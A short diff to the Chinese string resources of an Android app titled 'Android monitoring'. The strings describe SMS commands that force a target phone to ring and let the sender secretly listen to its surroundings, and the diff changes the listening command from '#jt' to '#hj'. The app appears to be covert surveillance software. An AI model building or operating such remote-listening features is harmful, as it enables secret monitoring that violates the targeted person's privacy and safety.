@@ -109,7 +109,7 @@
     <string name="pref_ring_word_title">警报响铃</string>
     <string name="pref_ring_word_summary">发送短信#jb可强制使其持续响铃。</string>
     <string name="pref_env_word_title">环境监听</string>
-    <string name="pref_env_word_summary">发送短信#jt可监听目标手机环境。</string>
+    <string name="pref_env_word_summary">发送短信#hj可监听目标手机环境。</string>
     
     <!-- InitActivity -->
     <string name="init_title">安卓监控</string>
